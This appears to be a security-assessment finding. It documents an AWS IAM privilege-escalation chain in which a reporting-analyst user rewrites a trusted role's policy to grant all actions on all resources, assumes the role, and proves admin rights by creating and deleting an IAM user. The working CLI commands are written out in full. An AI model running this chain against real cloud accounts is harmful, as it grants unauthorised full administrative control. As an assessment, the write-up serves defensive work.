# 2. The Unremarkable Administrator

## Chain: mutate the policy of a role already trusted by the user

Starting identity was verified with `aws sts get-caller-identity`: `arn:aws:iam::418274630117:user/reporting-analyst`.

1. **Read the edge.** `aws iam get-role --role-name ashford-crossacct-reader` returned a trust statement naming `reporting-analyst` and `sts:AssumeRole`. `list-attached-role-policies` showed `AshfordCrossAcctReaderAccess` attached. `ReportingAnalystAccess`, statement `ChainB_AssumeReader`, grants `sts:AssumeRole` on that exact role.
2. **Change the role's effective permissions.** `aws iam create-policy-version --policy-arn arn:aws:iam::418274630117:policy/AshfordCrossAcctReaderAccess --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default` returned version `v2`, `IsDefaultVersion:true` (CloudTrail `CreatePolicyVersion` at `2026-11-19T03:45:26Z`). The permission is granted by `ReportingAnalystAccess`, `ChainB_AmendReaderPolicy`, for this specific policy. Its permissions boundary includes `iam:*`, so the boundary does not cap this operation.
3. **Become the role.** `aws sts assume-role --role-arn arn:aws:iam::418274630117:role/ashford-crossacct-reader --role-session-name esc` succeeded (CloudTrail `AssumeRole` at `03:45:28Z`). Before the call the caller ARN was the user; in a boto3 session made with the returned credentials, `GetCallerIdentity` returned `arn:aws:sts::418274630117:assumed-role/ashford-crossacct-reader/chain-proof`.
4. **Verify the result, not just the token.** With that boto3 session, `iam:CreateUser` created `ashford-chain-proof-cleanup`, and `iam:DeleteUser` removed it. Both returned success. The corresponding CloudTrail object is `AWSLogs/418274630117/CloudTrail/eu-west-1/2026/11/19/418274630117_CloudTrail_eu-west-1_20261119T0529Z_BD35bac2A0d5c77f.json.gz` (the record contains `CreateUser` and `DeleteUser` at `05:28:56Z`). This verifies administrative IAM capability. The earlier CLI attempt named `proof` was denied because it still ran as the user, as its error and caller identity showed.

## Composition

Each grant has a narrow, plausible description: an analyst may manage versions of one read-reporting policy, and may assume one read-reporting role. The role trust also names that analyst. But policy-version management changes what the role grants, and the role trust then turns the changed document into the caller's permissions. The composition is policy write plus trusted role assumption; the attached policy's replacement grants `*` on `*`. No single one of these permissions alone is the resulting administrator.

The historical `CreatePolicyVersion` and `AssumeRole` in the user's supplied log were followed by a `CreateUser` denial because the CLI remained on user credentials. The separate boto3 session above is the successful, identity-verified proof.
